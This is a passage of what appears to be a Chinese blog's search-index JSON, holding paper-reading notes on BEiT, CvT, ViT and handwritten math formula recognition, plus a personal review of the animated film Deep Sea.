图像分类：使用softmax作为任务层，对学习到的表达形式使用平均池化后，直接使用softmax进行分类softmax(avg({hiL}i=1NWc))softmax(avg(\\{h_i^L\\}^N_{i=1}W_c))softmax(avg({hiL​}i=1N​Wc​)),其中hih_ihi​是第i个图像patch最后的编码向量，Wc∈RD×CW_c \\in R^{D \\times C}Wc​∈RD×C是权重矩阵，C是标签数量。 图像分割：使用BEIT作为编码器，使用一些列反卷积作为解码器来进行分割。 Intermediate fine-tuning：在自监督的预训练之后，本文继续使用更大的中间数据集（例如ImageNet-1K）来训练BEIT。 实验 对比了各种自监督学习、从头训练的模型，训练epoch为800 消融实验 消融实验师兄300epoch对模型进行了训练结果如下： 使用随机遮盖代替blockwise遮盖，发现后者对于图像分类任务和图像分割任务均更有效，尤其是在图像分割任务中。 其次使用预测原始像素代替了原本的预测patch token，结果发现消融后的模型甚至不如直接使用数据集对ViT进行训练。因此本文认为patch token的预测是BEIT成功的关键成分。 再次作者同时删除了blockwise遮盖和patch token预测，作者发现甚至对于直接的像素预测，blockwise遮盖也是有一定作用的。 恢复所有的visual tokens对于下游任务的表现是有害的。 比较累不同training steps下的BEIT，发现使用进行更长时间的预训练会对下游任务实现进一步提升。","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"},{"name":"ViT预训练","slug":"ViT预训练","permalink":"http://enderxiao.github.io/tags/ViT%E9%A2%84%E8%AE%AD%E7%BB%83/"}]},{"title":"基于多尺度特征融合的互学习脱机手写数学公式识别论文阅读","slug":"基于多尺度特征融合的互学习脱机手写数学公式识别论文阅读","date":"2023-03-15T02:36:28.000Z","updated":"2024-07-30T11:26:33.932Z","comments":true,"path":"2023/03/15/基于多尺度特征融合的互学习脱机手写数学公式识别论文阅读/","permalink":"http://enderxiao.github.io/2023/03/15/%E5%9F%BA%E4%BA%8E%E5%A4%9A%E5%B0%BA%E5%BA%A6%E7%89%B9%E5%BE%81%E8%9E%8D%E5%90%88%E7%9A%84%E4%BA%92%E5%AD%A6%E4%B9%A0%E8%84%B1%E6%9C%BA%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%AF%86%E5%88%AB%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"","text":"标题 基于多尺度特征融合的互学习脱机手写数学公式识别 研究内容 使用Transformer Decoder替换原本的RNN，由此改善欠解析和过解析的问题，同时对更称序列有更好的识别效果 设计不同的特征融合策略，环节细节再低分辨率特征映射中丢失严重的问题 学习是写字体与打印字体的语义不变性 设计新的损失函数 实现 多尺度特征融合 本章针对DenseNet对细粒度特征的提取不够准确的问题进行了分析，认为细节会再低分辨率特征映射中丢失，导致欠解析的现象。 因此考虑在进行特征提取的编码器阶段获取两个尺度的特征信息，进行特征融合。 本文对比了以下三个方案： 损失融合： 编码器最终会提取出两套不同尺度的特征图，分别输入解码器后，计算出两个尺度的损失，将俩者取平均值，使用最终的平均损失作为下一阶段梯度更新的依据。 特征融合： 同样是在编码阶段提取出两套不同尺度的特征图 将尺度较小的特征图上采样到与大特征图相同的尺寸后进行拼接得到最终的特征图。 对融合后的特征进行特征解码。 HRNet特征提取： 丰富网络的结构，增加多条并行路径，分别提取不同分辨率的特征图 提取到四个不同尺度的特征图并最终进行融合。 下面是三种方式的网络结构图： 实验 最终通过对比实验得到如下结果： Dataset Methods ExpRate","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"}]},{"title":"CvT论文阅读","slug":"CvT论文阅读","date":"2023-02-16T07:40:40.000Z","updated":"2024-07-30T11:26:33.906Z","comments":true,"path":"2023/02/16/CvT论文阅读/","permalink":"http://enderxiao.github.io/2023/02/16/CvT%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"本文通过将CNN引入ViT以提升ViT的效率","text":"本文通过将CNN引入ViT以提升ViT的效率 摘要 本文主要通过两种手段将CNN与ViT的优势结合： a hierarchy of Transformers containing a new convolutional token embedding a convolutional Transformer block leveraging a convolutional projection 这一工作即引入了CNN的优点，如平移不变性、shift、scale 同时保留了Transformer的优点，例如动态注意力（dynamic attention）、全局视野（global context）、better generalization 并且本文证明位置编码在该模型中可以被去除。 引言 本文提出虽然ViT在大数据集上训练得到了非常好的结果，但其在小数据集上的训练接过仍然劣与ResNet，并给出了如下原因： ViT缺少一些CNN结构自带的适合于视觉任务的某些理想的特性，例如图片包含很强的2D位置结构，特别是邻近的像素具有强相关性。 CNN利用共享权重（shared weights）、特殊的降采样（spatial subsampling）、感受野（local receptive fields）来利用这些特性。同时CNN的多层级卷积核结构也利于提取不同视野中的特性。 CvT将CNN引入到ViT中的两个核心区域： 首先将Transformer拆分为多个层级stage，每个stage的包含一个convolutional token embedding，该模块的作用是将overlapping convolution operation with stride作用在一个2D的token map上，例如将展平的token序列变回空间形式。随后进行一次Layer Norm。这使得模型不仅能关注局部信息，同时还能渐进式地降低序列的长度，同时增加token的维度。从而实现一种特殊的下采样，同时增加feature map的数量。 其次，每个self-attention前的一个线性投影层被替换为了本文提出的卷积投影层(convolutional projection)，本层提供一个s×ss \\times ss×s深度可分离卷积(Depth-wise separable convolution)，见附录，做用在一个2D-reshaped token map上。本文认为这一的做法能让模型更深入的捕捉空间信息，并且减少注意力机制的语义歧义。卷积过程中卷积核的步长可以对Key和Value进行下采样，从而提升4倍或更多的效率，而只带来了非常小的性能损耗。 分文通过实验证明了在本模型中，可以去掉位置编码，且并不会导致模型效果减弱。 结论 本文提出了一个能够结合Transformer和CNN有点的网络，并用大量的实验论证了convolutional token embedding和convolutional projection，以及多阶段设计的网络结构能够达到优越的效果，同时保持了计算效率，CvT不再需要位置编码，即能够在适应各种需要可变输入分辨率的视觉任务方面具有潜在的优势。 相关工作 ViT相关论文 DeiT 挖掘了如何才有更高效的训练方式以及只是蒸馏等方法来训练ViT CPVT Conditional Position encodings 使用了conditional position encodings（CPE）代替ViT中的位置编码，使得Transformer能够处理任何大小的输入，而不做插值 TNT Transformer-iN-Transformer 一个outer Transformer block，处理patch embedding 一个inter Transformer block，处理pixel embedding之间的关系，处理patch层级和pixel层级的表示 T2T Tokens-to-tokens 这一工作主要提升了ViT中的image to token的部分，使用滑动窗口将多个token合并为一个。但这一方法从本质上与convolutions是有区别的，特别是在normalization details上， 并且对token的合并极大的增加了计算复杂度和内存占用 PVT 将multi-stage的设计与Transformer结合（没有引入convolutions），从而使得ViT更适合dense预测任务 模型对比 将self-attention引入CNN BotNet 提出了一种使用全局自注意力（global self-attention）替换ResNet中最后三个块（bottleneck blocks）中的psatial convolutions，从在图像识别上取得了很好的效果。 将CNN引入Transformer CVPR 2021 Evolving Attention with Residual Convolutions这篇文章提出了使用残差连接传递attention map的方法。 工作 总体结构 本文想Transformer引入了两个基于CNN的块： Convolutional Tolen Embedding Convolutional Projection 本文所采用的类似CNN的多层级结构，源自论文Object recognition with gradient-based learning和论文Deep residual learning for image recognition。 本模型分为三个Stage，每个stage被分为两个部分： 首先，输入图片或feature map会被输入到Convolutional Token Embedding layer中，该层次由一个重叠卷积构成，并将token重塑成2D空间网格。其中增加了一个额外的layer normalization从而使得各个stage逐级减少token的数量，同时增加token的长度，达到空间下采样和增加表达丰富度的效果。与之前的工作相比，本实验不需要引入位置编码。 其次，结果会被输入到一个Convolutional Transformer块中，该块使用了一个depth-wise separable convolution操作，作为卷积投影，得到query 和 key和value的embedding表示，并且classification token只在最后一个stage中被添加 最后一个MLP头被用作分类器，基于classification token进行分类。 Convolutional Token Embedding 对于一个2D图像或2D token map xi−1∈RHi−1×Wi−1×Ci−1x_{i-1} \\in R^{H_{i-1} \\times W_{i-1} \\times C_{i-1}}xi−1​∈RHi−1​×Wi−1​×Ci−1​的i-1层输出，模型学习一个映射f能够将xi−1x_{i-1}xi−1​映射到一个具有通道数为CiC_iCi​的tokenf(xi−1)f(x_{i-1})f(xi−1​) 其中f是一个s×ss \\times ss×s的卷积核，stride为s−os-os−o，padding为ppp f(xi−1)f(x_{i-1})f(xi−1​)的形状为Hi=⌊Hi−1+2p−ss−o+1⌋,Wi=⌊Wi−1+2p−ss−o+1⌋,CiH_i = \\lfloor \\frac{H_{i-1} + 2p -s}{s-o} + 1 \\rfloor, W_i = \\lfloor \\frac{W_{i-1} + 2p -s}{s-o} + 1 \\rfloor, C_iHi​=⌊s−oHi−1​+2p−s​+1⌋,Wi​=⌊s−oWi−1​+2p−s​+1⌋,Ci​ 随后进入LN层进行归一化操作。 Convolutional Projection for Attention token先被reshape为2D的token map，然后使用depth-wise separable convolution的size为s的卷积核进行卷积，最后token被展平为1D序列，使用数学表示为： xiq/k/v=Flatten(Conv2d(Reshape2D(xi),s))x_i^{q/k/v} = Flatten(Conv2d(Reshape2D(x_i), s))xiq/k/v​=Flatten(Conv2d(Reshape2D(xi​),s)) 其中Conv2d过程如下： Depth−wise Conv2d→BatchNorm2d→point−wise Conv2dDepth-wise \\ Conv2d \\to BatchNorm2d \\to point-wise \\ Conv2dDepth−wise Conv2d→BatchNorm2d→point−wise Conv2d s为核大小。 效率 本文提到模型有两处提升效率的策略： 使用depth-wise separable convolution代替传统卷积操作从而降低时空复杂度 引入Convolutional Projection来降低MHSA操作的复杂度，如上图所示，使用了步长为2的卷积核来处理key 和 value，而使用了步长为1的卷积核处理query。 使用步长为2的卷积核来处理key和value能使得key和value缩小4倍，因此计算MHSA的复杂度也将降低四倍。这一操作带来的性能损耗是非常小的。本文给出的原因是临近的像素或patch在形态和语义上存在冗余。此外，由于分辨率下降造成的信息丢失，将会由ConvolutionalProjection对图片上下文的建模来补偿。 实验 本次实验采用ImageNet数据集，带有1.3M的图片和1k个分类。以及它的超集ImageNet-22K，包含22K个分类和14M大小的图片对模型进行与训练。然后再CIFAR-10/100,Oxford-IIIT-Pet,Oxford-IIIT-Flower数据集上进行迁移学习。 本文使用CvT-13和CvT-21作为基础模型，其中13和21分别代表Transformer block的数量，此外还构建了规模更大的模型CvT-W24，W代表宽度，这意味着每个stage将接受更大的token。 训练采用的优化器为AdamW，CvT-13配置的weight decay为0.05，CvT-21和CvT-W24配置为0.1。初始的学习率为0.02，batch size为2048， 训练300轮。训练过程使用余弦学习率衰减策略。 Fine-tuning使用了与ViT一样的SGD优化器，momentum设置为0.9，batch size为512，再ImageNet-1K上使用20000steps，CIFAR-10和CIFAR-100上使用10000个steps，Oxford-IIIT Pets和Oxford-IIIT flowers-102上采用500个steps 消融实验 位置编码 通过实验证明了使用位置编码并不会对效果造成任何影响。本实验使用了DeiT-S进行对比实验，实验去除了DeiT-S的Position Embedding，造成了效果的下降，但对CvT-13的实验包含了为每个stage添加Position Embedding、只给第一个stage添加Position Embedding、只给最后一个Stage添加Position Embedding、不添加Position Embedding，都不会对最后的效果造成影响。 另外本文通过使用non-overlapping Patch Embedding替换了本文提出的Convolutional Token Embedding，这一操作导致了准确率下降了0.8%，之后作者为替换后的模型加入position embedding，的带看0.4%的准确率提升，而，作者继续加入Convolutional Token Embedding，得到了0.3%的准确率提升，最后作者删去添加的position embedding，结果是性能继续提升了0.1%左右。因此作者认为Convolutional Token Embedding不仅提升了性能，而且能够代替Position Embedding Convolutional Projection 本文首先对Convolutional Projection中卷积核使用的步长进行了实验，分别在对key和value进行卷积操作时，使用步长为1，和步长为2的模型进行训练，发现步长为2时，会导致精度下降0.3%，但伴随着30%的复杂度降低。因此本文对key和value采用步长为2的卷积操作。 接着本文使用Position-wise Linear Projection替换本文提出的该模块进行实验，准确率由81.5%下降为80.6%。并且会随着更多stage使用本文提出的模块而获得更高的准确率。","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"},{"name":"CvT","slug":"研究生/科研/OCR/CvT","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/CvT/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"}]},{"title":"ViT论文阅读","slug":"ViT论文阅读","date":"2023-02-15T11:26:55.000Z","updated":"2024-07-30T11:26:33.916Z","comments":true,"path":"2023/02/15/ViT论文阅读/","permalink":"http://enderxiao.github.io/2023/02/15/ViT%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"在图像识别任务中使用纯Transformer","text":"在图像识别任务中使用纯Transformer 摘要 在CV中self-attention通常会与CNN一起使用，本文提出，只需要使用单独的Transformer模型就能对该任务进行有效的处理，并且在庞大的数据集上训练后，迁移到小数据集上时，效果将达到SOTA 引言 对于Transformer模型而言，self-attention需要对输入的每一个元素两两之间进行交互，假设元素长度为N，那么这一过程则需要O(n2)O(n^2)O(n2)的复杂度。在NLP领域中，类似BERT的模型目前最大只能支持到N=512的输入。而CV中图像检测、识别的数据中，大的图片将达到800*800的像素，这就意味着我们需要找到一种合适的方法，将2d的图片投影到1d，并使其数据量相对减少。 一些思路是将CNN与self-attention混用，即将CNN的特征图作为Transformer的输入[1] 另一些直接放弃CNN的方法是将2d的图片矩阵才分为H*W两个1d的向量，即先对高做一次self-attention， 再对宽做一次self-attention，这样就只进行了两次顺序的self-attention[2 stand-alone attention]，这一方法虽然高效，但使用了特殊的注意力机制，无法使用硬件加速，因此无法将模型做的太大。 本文的思路是将一张图片转化为一个一个patch组成的图片。即认为一个patch是16像素，那么一个224 * 224的图片，我们可以认为他是由 14 * 14个16 * 16个的小patch构成的。于是将16 * 16个patch作为transformer的输入。 本文训练时使用有监督训练。 与本工作类似的有ICLR 2020的论文[3]，该片文章只使用了2*2的patch 本文表示如果不加约束条件，ViT与规格相同的ResNet相比，效果稍弱，原因在于ResNet包含了一些ViT所不具备的先验知识，这些先验知识包括： locality：局部性，即相邻的区域会有相邻的特征，CNN由滑动窗口组成，因此天然具备这一特性 translation equivariance：平移不变性，即同样的物体无论移动到哪里，只要是同样的输入，遇到了同样的卷积核，输出将不变。 本文在ImageNet、ImageNet-ReaL、CIFAR-100、VTAB数据集上进行了实验来论证上述推论。 结论 本文除了在产生patch和计算位置编码时引入了图像的归纳偏置，除此之外就再也没有引入图像特有的归纳偏置，即不需要对vision由先验知识。 相关工作 NLP领域中，在但数据集上训练好，再用小数据集微调的模型，例如BERT使用的是分离子监督学习，即完形填空式——讲句子中某些词划去然后让模型预测；GPT使用language modeling，即已经有一个句子，预测下一个词是什么。上述训练方法都是自监督训练。 另一个与本文相似的工作是Image GPT(iGPT)使用无监督的学习来训练的生成模型，该模型同样使用Transformer，但该模型在ImageNet上的准确率只能达到72% 方法 模型上本文尽可能采用original Transformer ViT模型 如图所示的结构中，模型先讲图片分为不同的patch，然后经过一个线性投影层，这个过程中，为了保证patch之间的位置关系，加入了位置编码Position Embedding。 然后输入到Tranformer Encoder，得到很多输出。 进行分类任务时，该模型借鉴了BERT的思想，BERT中提到使用Extra Learnable Embeding，CLS。 ViT同样使用这一方法，讲这一字符融入Position embedding中（图中用*表示），放在位置信息为0的位置。由于self-attention中每个位置都会与余下所有位置进行交互，因此该位置将会从其他位置中学习到有用的信息。因此，只需要用这一项的输出进行分类即可，如图MLP Head即用于分类的简单MLP。 ViT模型相对简洁，而它的特殊之处，是如何将一张图片变为一系列的token。 图像处理 例如： 我们使用维度为244 * 244 * 3的彩色图片作为输入，让每个Patch的维度大小为16 * 16 那么得到的token数N=2242162=196N = \\frac{224^2}{16^2} = 196N=1622242​=196 每个token的大小为16 * 16 * 3 = 768 模型中的线性投影层则是一个全连接层，此处使用E表示，E的维度是768 * 768 于是输入X经过线性投影层的变换后的计算过程为： $X E = [196 * 768] * [768 * 768] = [196 * 768] $ 注：此处为[]外的为矩阵 最终我们得到的便是一系列1d的token，而不是2d的图片，最后计算上加入的CLS大小1*768 最终得到的输入将是197 * 768规模 位置信息的长度将被设定为768，直接使用加法操作加到token中，因此这一步不会改变token的维度，仍然是197 * 768 输入Encoder 接下来我们将这些输入Transformer Encoder。 首先经过Layer Norm层后，输入将被分为q，k，v进行多头自注意力模块，此时的q,k,v都是197 * 768 但Base 版的ViT使用了12头的注意力机制，因此每个头输入将变为197 * (768/2) = 197 * 64 最后将12个头的输出进行拼接得到197 * 768 经过另一个Layer Norm后，MLP层会将维度进行放大（一般是放大四倍），变为197 * 3072，然后再缩小投射回去，变为197 * 768 位置编码 本文使用了一个标准可学习的1D位置编码，即BERT中的位置编码，本文作者尝试了别的编码形式例如2D-aware位置编码，但最后发现结果并无显著变化。 消融实验 分类特征 本文使用CLS做分类，本文使用的分类模块是一个以tanh作为非线性激活函数的MLP。 此处的CLS是从NLP借鉴来的，但CV领域使用CNN进行分类时，通常对最后得到的feature map进行globally average-pooling（GAP） ，得到一个1d向量然后进行分类。 本文最先做的实验是，使用GAP代替CLS。 即对于Transformer Encoder的所有输出进行一个GAP，然后以此来分类，而不是添加一个CLS。 实验结果是两种方法效果一致。 位置编码 本文主要讨论了三种位置编码： 1D：本文使用得到NLP领域中常用的位置编码，每个位置编码长度为D 2D：使用矩阵来表示位置，分为X-embedding和Y-embedding每个位置编码长度为D/2，每个输入将分别得到一个X-和一个Y-embedding，拼接后得到D维度的embedding。 relative positional embedding：使用各个块的相对位置来表示位置 但消融实验结果表明使用哪种位置编码并不会影响模型精度和效率。本文认为，由于使用了patch作为基本单位，并不是使用像素作为输入，因此想要知道patch之间的位置关系要比像素之间的位置关系要容易，因此位置编码的类型并不会影响实验结果。 归纳偏置 Transformer要比CNN少很多图像上的归纳偏置。 关于混合CNN与ViT的混合网络： 本文使用ResNet得到的14 * 14的特征图替换ViT中的14 * 14个patch，来进行实验。 Fine-Tuning 使用预训练好的ViT模型在小规模的数据集上进行微调时，理论上只要硬件允许，可以使用更大的图片（&gt; 224 * 224）进行微调，但是随着图片的增大，如果patch size不变，那将导致输入维度增大。硬件允许的条件下，增大的输入是可行的，但训练好的位置编码将无法使用，因为patch改变了。 本文发现，这种情况下，只需要对位置编码进行2D差值即可，本文使用torch自带的interpolate函数即可完成。 实验 该部分使用了与训练的ResNet和各种尺寸的ViT进行了对比。 该部分实验中特别提到预训练的ResNet、ViT、Hybrid（ResNet混合ViT）进行不同数据大小的对比，该实验先采用JFT 300M（都采用大数据集进行预训练屏蔽数据规模对模型的影响）进行与训练，然后在ImagNet-Real、Pets、flowers、cifar20和cifar100上进行实验然后取平均，右图是ImageNet-Real上单独的结果： 如图可以发现，在小数据集上Hybrid模型效果要优于纯ViT和ResNet，在同等的计算复杂度下，ViT要优于ResNet，但在较低的计算复杂度下，Hybrid的效果表现较好。另外，随着计算复杂度的上升，ViT的效果逐渐超过Hybrid，关于为什么CNN抽离出的特征为什么没有帮助Transformer进行更好的学习，本文并未给出对这一现象的解释。 自监督训练 本文模仿了BERT中的mask方法，即mask掉句子中的一些单词，让模型预测出该词语，本文提出了一个patch-mask，即mask掉一些patch，然后让网络重建这些patch。但是该方法仍然比最好的有监督的预训练低了4% feature work 本文希望引入CV中的对比学习来使ViT可以进行自监督学习。随后的MoCo v3，DINO就是使用Contrastive训练的ViT","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"论文","slug":"研究生/论文","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E8%AE%BA%E6%96%87/"},{"name":"Transformer","slug":"Transformer","permalink":"http://enderxiao.github.io/categories/Transformer/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://enderxiao.github.io/tags/CV/"},{"name":"图像处理","slug":"图像处理","permalink":"http://enderxiao.github.io/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"论文笔记","slug":"论文笔记","permalink":"http://enderxiao.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"},{"name":"Transformer","slug":"Transformer","permalink":"http://enderxiao.github.io/tags/Transformer/"},{"name":"端到端","slug":"端到端","permalink":"http://enderxiao.github.io/tags/%E7%AB%AF%E5%88%B0%E7%AB%AF/"},{"name":"ViT","slug":"ViT","permalink":"http://enderxiao.github.io/tags/ViT/"}]},{"title":"《深海》一场不愿从中醒来的梦","slug":"《深海》一场不愿从中醒来的梦","date":"2023-02-11T08:06:46.000Z","updated":"2024-07-30T11:26:33.921Z","comments":true,"path":"2023/02/11/《深海》一场不愿从中醒来的梦/","permalink":"http://enderxiao.github.io/2023/02/11/%E3%80%8A%E6%B7%B1%E6%B5%B7%E3%80%8B%E4%B8%80%E5%9C%BA%E4%B8%8D%E6%84%BF%E4%BB%8E%E4%B8%AD%E9%86%92%E6%9D%A5%E7%9A%84%E6%A2%A6/","excerpt":"为什么看深海可以共鸣","text":"为什么看深海可以共鸣 观影体验 一个动画公司，为什么能让人印象深刻，为什么能让一部电影一看就是出自他们工作室的作品？ 对于我个人而言，这个答案是这些工作室的作品都具有统一且独道的风格。 对于动画风格这个词，我也许并不能对它做出很好的定义，但我记得第一次看风之谷时，尚在读幼儿园的我，并不能看懂风之谷所讲述的故事，但某一天我我看到了龙猫，天空之城，红猪，百变狸猫，魔女宅急便，我能迅速联想到风之谷这部电影，也许这就是我所理解的风格。 note quote 我们觉得动画片有很多可以挖掘的，吉卜力他们会为自己的风格花很长时间因为那是他们找到的，皮克斯会花十年的时间去研究三维，因为那是他们找到的，水墨是中国的，它是独特的，那我们认为水墨是值得我们去做的 崇尚写意的中国水墨，如何与模拟出显示的计算机图形学技术相结合，是三维水墨想要完成的事情。 这部电影带给我的视觉冲击无疑是震撼的，例如水母： 水母 又例如片中可爱的水獭蓬松的毛发： 獭獭 而对于许多物体、颜色、人物复杂的场景也能让我很好的聚焦到画面中属于剧情的主体人物。 但对新技术的使用仍然体现出了稚嫩的地方。例如在亮title的那一段中，特别是水母出来前后的一段，造成了非常明显的眩晕感，不知道是第一次见这种画面造成的不适应还是阴影关系不正常导致的眩晕。 影片的开头到中间完全被梦幻般的画面吸引，期待影片的每一个画面，期待角色的每一个举动，完全没有被繁杂的叙述推着走的疲惫感，不过是为了一个有一个简单的小目标，慢慢前进的轻松与愉快，就好像在做梦一样，期待着那个我们无法左右的梦境世界如何发展。 但影片中穿插的梦境与显示的千丝万缕的联系，也在告诉我这是一场梦境。我清楚的知道这不过是一场梦，但又不愿意相信这就是一场梦。我希望深海大饭店的故事可以一直持续下去。 直到片尾小女孩醒来。我始终不愿意相信这真的只是一场梦，此时我与参宿达成了情感上的和一，一心想要停留在梦里，不愿回归显示。因为在梦里大家是友善的，没有利益关系，不用在意他人的目光。 参宿突破幕布，重回梦境的那一刻我哭了，重返现实的那一刻我又哭了。也许对于我而言，参宿和我过于相似了。即使在自己25岁这年，仍然是一个孤独，不自信，表现的很乖，渴望用乖巧博得别人的爱的人，以及会放大别人的否定的人。 梦与现实 深海中的海精灵与丧气鬼，好似形成了矛盾的两端，海精灵是参宿梦境中由妈妈回眸的影子形成，而丧气鬼则是会寻找悲伤的人，将起周围的一切拖入体内溺死的红鬼。影片的开始我以为海精灵不过是一个单纯的“好”角色，而丧气鬼则是标准意义上的“坏”角色，而往往我们所希望的世界，也并不是只有黑或者只有白，而是黑白分明的二元世界。 海精灵 但对于现实而言，黑色的海精灵脱胎于妈妈的秀发，是参宿所追求的美好向往，而红色的丧气鬼则代表了参宿那件时刻不离身，始终笼罩着自己的红外套。对于参宿而言，妈妈是自己渴望得到，但又没办法得到的东西，是参宿的期待，是参宿的向往，但又同样是参宿无法释怀，无法缓解的痛苦。就好像一个结，让参宿向往的同时，又将参宿带入深渊。 现实中，妈妈是参宿解不开的结。 而到了梦境里，海精灵变成了可以让人产生美好幻想的“食材”。 因为心结往往由人心中的不甘化成，我偶尔会想，如果我和她，能早点在一起，如果我当时能直面自己内心的感情，如果… 偶尔会想，如果自己早一点进入社会，如果自己选择的不是这所学校，如果自己能在努力一点。如果我能更勇敢的和爸妈说出我的想法。 而影片中食客们喝下汤后，会将奇怪的菜看成是美味佳肴，能看到金银珠宝，参宿喝下汤后会将南河看成是照顾自己的妈妈。 随着影片的推进，海精灵的原型由妈妈变成了南河，也预示着参宿从妈妈离开自己的无法释怀，转变为了对南河的依赖与不舍。 南河带领船队寻找海精灵，寻找深海之眼，最终促成了参宿直面心结，解开心结的过程。 丧气鬼 现实中的红色外套，是参宿所困的回忆，她不愿离开这件外套，止步不前。同时这件外套也是在保护这参宿，一旦参宿遇被否定，被嫌弃，被不需要，参宿就会将自己包裹进这件红外套里，将自己封闭在与妈妈的那段快乐的回忆里，也许那是她为数不多的美好时光。 而在梦境中，丧气鬼也并没有真正意义上的伤害过参宿，当丧气鬼第一次来临时，化解危机的南河看到的参宿是被丧气鬼紧紧包裹的状态，她覆盖着参宿，就好像是参宿的铠甲，将其保护在里面。而随着南河说出对参宿造成伤害的话语，参宿身上的丧气鬼粒子逐渐增多，逐渐覆盖住参宿更多的身体。 note quote 红鬼从来没有真正意义上地伤害过参宿，它知识包裹她、缠绕着她，想要把参宿保护起来…甚至是抓住参宿的适合，也不是攻击的方式，而是去包围着她，就像红帽衫上的帽子一样，是一种过度的保护 南河 事实上参宿从梦中醒来后，自己的家人，朋友并没有改变，真正让参宿走出来的是参宿自己。但参宿实现转变，则需要一个人让参宿感受到时间的温暖，让参宿抓住这一束光，看见世界的美好。 而南河则充当一个为参宿持续输出善意的角色。 但同样的，南河并不是像梦境中那样是位有耐心，富有善意的船长。现实中的南河一开始对参宿说话随意凶狠，捡到参宿的手机又想据为己有。但这位小丑又是不顾一切跳下去救参宿的人。 南河在参宿的一生中，总是充当着微笑这一角色，他总说参宿的笑带着几分假，试图教会参宿微笑，同时，南河夸张的表情在告诉参宿什么是真正的笑。南河脚上的球鞋也是外侧印着笑脸，内测印着哭脸。 南河是一个已经完成了自我改变，接受了现实世界的人，而参宿与其相对是一个无法接受现实，渴望逃避的小孩。 冬季大三角 从《深海》的纪录片中我们可以了解到，南河三、参宿四、天狼星，三颗星星构成了冬季中最明亮的冬季大三角，而参宿四是一个正在覆灭的红色巨星，它的状态极为敏感，终将消失在我们眼中。 其他角色 参宿的父亲老金、继母花花、弟弟糖豆，在参宿的梦中都有了更为完美的诠释，勇敢憨厚的舵手海象老金，善良温柔的花花阿姨，顽皮可爱，懂得给予的小海獭糖豆，在参宿的梦中，一切不完美变成了参宿所期盼的样子。 现实中小到只能容下一人的小黄鸭，在参宿被救起时巨大且丰盈，不合脚的鞋子，在梦中变成了柔软舒适的拖鞋。 梦境即使现实的完善，我们将不完美留在现实，投身于一个有一个梦中，在那里我们可以休憩，可以幻想。可以构造一个理想的世界。 放映机 